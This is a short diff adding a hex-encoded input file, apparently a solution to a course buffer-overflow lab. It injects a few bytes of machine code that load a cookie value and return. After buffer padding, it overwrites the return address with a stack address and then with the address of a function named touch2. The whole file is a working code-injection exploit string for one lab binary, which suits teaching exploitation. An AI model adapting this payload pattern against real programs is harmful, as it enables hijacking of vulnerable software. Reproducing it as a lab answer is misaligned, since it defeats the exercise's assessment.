@@ -1,0 +1,14 @@
+/* Buffer plus cookie */
+48 c7 c7 d5 06 f3 23 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Ret addr of getbuf */
+/* 0x5551fa10 */
+10 fa 51 55 00 00 00 00
+
+
+
+/* Ret addr of touch2 */
+/* 0x401df4 */
+f4 1d 40 00 00 00 00 00
